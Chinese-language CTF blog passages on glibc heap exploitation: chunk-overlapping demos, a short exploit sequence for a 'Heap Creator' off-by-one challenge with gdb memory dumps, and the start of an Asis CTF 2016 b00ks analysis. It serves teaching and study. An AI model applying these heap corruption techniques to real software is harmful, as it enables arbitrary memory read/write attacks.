<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0xd1</span>;		<span class="comment">//修改free状态下的chunk1的size</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0xc0</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h3><p>前面展示的都是后向合并（向高地址的chunk合并）</p>
<p>其实也可以通过修改当前chunk的prev size跟inuse位实现前向合并（向低地址的chunk合并），但是要满足unlink的条件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);	<span class="comment">//中间包含的小块</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);	<span class="comment">//垫一块</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(ptr2 - <span class="number">1</span>) = <span class="number">0x90</span>;		<span class="comment">//修改chunk2的size</span></span><br><span class="line">    *(ptr2 - <span class="number">2</span>) = <span class="number">0xf0</span>;		<span class="comment">//修改chunk2的prev size</span></span><br><span class="line">    <span class="built_in">free</span>(ptr2);		<span class="comment">//触发unlink实现前向合并</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0x170</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中把chunk1 free掉是为了让其进入unsorted bin，从而使其fd跟bk指针的值能过unlink的检测，否则会报错。</p>
<h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ol>
<li><p>prev size的复用问题：学基础知识的时候知道有这么个概念，到这里才比较理解。其实很简单，例如我们malloc一个0xn8（除了0x8，因为64位chunk最小对齐到0x20）的chunk，实际上我们只会得到一个数据段大小为0xn0的chunk，剩下的八个字节就用与其相邻的那个chunk的prev size位来存储。</p>
<p>例如我们<code>malloc(0x18)</code>，实际上得到的chunk大小为0x20，如下图，不够的八个字节用了top chunk的prev size来补</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1192020</span><br><span class="line">0x1192020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1192030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1192040:	0x6161616161616161	0x0000000000020fc1</span><br></pre></td></tr></table></figure>

<p>这就有一个问题，比如当程序中存在off-by-one的时候，我们可以通过利用其复用prev size的特性，来让某一个chunk的数据区紧贴其下一个chunk的size位，这样我们就可以直接将下一个chunk的size的低一字节盖掉。</p>
</li>
<li><p>通过extend_overlopping利用fast bin来实现任意地址读写，具体在例题中说明。</p>
</li>
</ol>
<p>（libc-2.23下复现）</p>
<p>首先是常规菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体代码不贴了，简单说一下就行</p>
<p>在<code>1. Create a heap</code>功能函数中程序要求我们输入heap的size以及content，程序会先malloc一个0x10大小的chunk用来保存content的size和content chunk的指针（低位八个字节保存size，高位八个字节保存chunk指针），可以理解为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span>* content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且这个用来记录heap信息的chunk被保存到了.bss段上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;heaparray + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br></pre></td></tr></table></figure>

<p>然后程序根据我们输入的size去<code>malloc(size);</code>，用这个chunk来保存content，并且我们输入的size无限制，create功能函数结束。</p>
<p>edit功能函数中存在off-by-one</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">read_input(*(*(&amp;heaparray + v1) + <span class="number">1</span>), **(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>show功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<p>delete功能函数，可以看到不存在uaf漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">  *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="通过extend-overlopping利用fast-bin来实现任意地址读写的详解"><a href="#通过extend-overlopping利用fast-bin来实现任意地址读写的详解" class="headerlink" title="通过extend_overlopping利用fast bin来实现任意地址读写的详解"></a>通过extend_overlopping利用fast bin来实现任意地址读写的详解</h4><p>这种先申请一个chunk去保存别的chunk的信息和指针的题目就老会有各种问题</p>
<p>我们想一想edit功能函数和show功能函数是根据什么去修改/查看堆内容的，显然是根据控制chunk中的size以及堆指针。那么如果我们能够修改这个控制chunk中的堆指针的话，我们不就能够利用edit和show功能函数去实现任意地址读写了吗？</p>
<p>那么如何实现呢？这里有一个思路就是extend_overlopping，我们让content chunk跟控制chunk重叠，使得控制chunk成为content chunk的一部分，而由于edit功能函数的存在，content chunk中的内容我们肯定是可以控制的，那么如果我们完成了这样的一个堆重叠的话，就可以修改控制chunk中的堆指针了，从而完成任意地址读写。</p>
<p>结合这一部分的exp详细演示一下吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>首先我们<code>malloc(0xn8);</code>，再<code>malloc(0x10);</code>，在例子中我malloc了0x18</p>
<p>我们先理一下在<code>1. Create a heap</code>功能函数中程序是如何申请堆块的：①程序先<code>malloc(0x10);</code>，这个chunk用来保存我们输入的size的值以及content chunk指针（我们把这个chunk称为控制chunk）。②程序接着<code>malloc(size);</code>，这个chunk用来保存content。</p>
<p>0xn8是因为我们得先让chunk间存在prev size的复用，然后我们才能够用off-by-one修改相邻chunk的size位</p>
<p>再申请一个0x10的chunk是为了得到一个跟控制chunk大小相同的chunk</p>
<p>此时堆长这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021	=&gt;保存堆指针的chunk1</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021	=&gt;我们申请的0x18的chunk2</span><br><span class="line">0x12a6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6040:	0x6161616161616161	0x0000000000000021	=&gt;保存堆指针的chunk3</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021	=&gt;我们申请的0x10的chunk4</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>为了方便叙述我们将以上几块chunk分别称作chunk1/2/3/4。</p>
<p>然后利用chunk2的off-by-one修改chunk3的大小，使其大小足以覆盖整个chunk4，这里我们将其修改成0x41</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;这里已经被修改</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>接下来用delete功能函数free掉chunk4，那么总共会free掉两个chunk：保存堆指针的chunk3以及保存内容的chunk4。但是由于chunk3的大小被我们修改成0x41，所以chunk3会进入到0x40的fast bin链中，chunk4正常进入0x20的fast bin链中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x12a6060 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x12a6040 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>最后我们<code>malloc(0x30);</code>，那么我们就会得到一个0x20和一个0x40大小的chunk，这两个chunk从fast bin中取，并且0x20的chunk用作控制chunk，0x40的chunk用来保存content</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;这时这块0x40的chunk是content chunk</span><br><span class="line">0x12a6050:	0x0000000000000061	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021 =&gt;这块0x20的chunk是控制chunk</span><br><span class="line">0x12a6070:	0x0000000000000030	0x00000000012a6050</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>到这里我们应该就能发现，我们最后得到的0x20的chunk是包含在0x40的chunk中的，我们就由此完成了通过堆重叠来修改堆指针的过程，那么我们只需要修改控制chunk中的指针，实现的就是任意地址读写的效果。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/" class="post-title-link" itemprop="url">堆利用-off_by_one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-05 18:01:07" itemprop="dateCreated datePublished" datetime="2022-05-05T18:01:07+08:00">2022-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-06 19:25:52" itemprop="dateModified" datetime="2022-05-06T19:25:52+08:00">2022-05-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="简述off-by-one"><a href="#简述off-by-one" class="headerlink" title="简述off_by_one"></a>简述off_by_one</h3><p>off_by_one指的就是一个字节的缓冲区溢出，常见的比如for循环中边界检查不当，还有strcpy函数在字符串尾部加上了一个结束符等等所造成的一个字节的溢出。</p>
<p>稍微特殊一点的情况就是单个NULL字节的溢出，比如上述的strcpy函数所造成的溢出就属于单个NULL字节的溢出，我们把这种特殊情况称为 NULL byte off-by-one 或者 off-by-NULL</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>具有off-by-one漏洞的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">my_read</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们仔细思考就会发现这个函数其实是不合理的（或者说是有问题的），比如我们传进该函数的长度为32，当我们输入完第32个字符的时候，a1实际指向了<code>传入的地址+32个字节</code>处， 这个地址实际上已经超出了传入的长度，最后<code>*a1 = 0</code>就造成了off-by-one</p>
<p>回到程序，在程序的开始首先会要求输入<code>author name</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到这里<code>my_read</code>的第一个参数是<code>off_202018</code>，在ida中看一看这个地方的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008 ; void *off_202008</span><br><span class="line">.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF: sub_980+17↑r</span><br><span class="line">.data:0000000000202008                                         ; .data:off_202008↓o</span><br><span class="line">.data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; delete:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: change_author+15↑o</span><br><span class="line">.data:0000000000202018                                         ; show+CA↑o</span><br></pre></td></tr></table></figure>

<p>可以看到<code>off_202018</code>的这个指针保存的是<code>unk_202040</code>的值，<code>unk_202040</code>其实就是与程序基址偏移为<code>0x202040</code>的地址，这个地址在<code>.bss</code>段中，所以我们输入的author name保存在了<code>unk_202040</code>这个地址里。</p>
<p>然后进入菜单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>Create a book</code>中要求输入book的名字（限制最长为32字节）跟内容（无长度限制），book的名字跟内容都分别申请了一个对应大小的chunk来储存，并且在最后申请了一个0x20大小的chunk来存储这个book的相关信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">book_struct = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);        <span class="comment">// 用一个0x20的chunk来保存book的相关信息</span></span><br><span class="line"><span class="keyword">if</span> ( book_struct )</span><br><span class="line">&#123;</span><br><span class="line">	*(book_struct + <span class="number">3</span>) = v1;			<span class="comment">//v1是content的大小</span></span><br><span class="line">	*(off_202010 + v2) = book_struct;	<span class="comment">//将指针保存到*(off_202010+v2)处</span></span><br><span class="line">	*(book_struct + <span class="number">2</span>) = content;		<span class="comment">//content是存储book的内容的chunk指针</span></span><br><span class="line">	*(book_struct + <span class="number">1</span>) = name;			<span class="comment">//name是存储book的名字的chunk指针</span></span><br><span class="line">	*book_struct = ++book_num;			<span class="comment">//*book_struct是该book对应的id</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们也要注意，<code>*(off_202010 + v2) = book_struct;</code>这条指令是将<code>book_struct</code>指针保存到<code>off_202010 </code>这个指针所指向的地址+v2个指针类型长度处（这里为v2个8字节），具体的可以从下面这段汇编看出来。（为什么要强调这个呢因为我个人基础不是很好所以写的时候复习一下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000112E                 lea     rax, off_202010</span><br><span class="line">.text:0000000000001135                 mov     rax, [rax]</span><br><span class="line">.text:0000000000001138                 mov     edx, [rbp+v2]</span><br><span class="line">.text:000000000000113B                 movsxd  rdx, edx</span><br><span class="line">.text:000000000000113E                 shl     rdx, 3</span><br><span class="line">.text:0000000000001142                 add     rdx, rax</span><br><span class="line">.text:0000000000001145                 mov     rax, [rbp+book_struct]</span><br><span class="line">.text:0000000000001149                 mov     [rdx], rax</span><br></pre></td></tr></table></figure>

<p>delete函数正常释放<code>book_struct、content、name</code>指针，并且将<code>off_202010 + v2</code>上的指针置零，不存在uaf漏洞。</p>
<p>edit函数根据<code>book_struct</code>指针去修改book的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">......</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter new book description: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !my_read(*(*(off_202010 + i) + <span class="number">16LL</span>), *(*(off_202010 + i) + <span class="number">24LL</span>) - <span class="number">1</span>) )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>printf功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(off_202010 + i);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, **(off_202010 + i));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">16LL</span>));</span><br><span class="line">      LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Author: %s\n&quot;</span>, off_202018);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后一个修改author name的功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

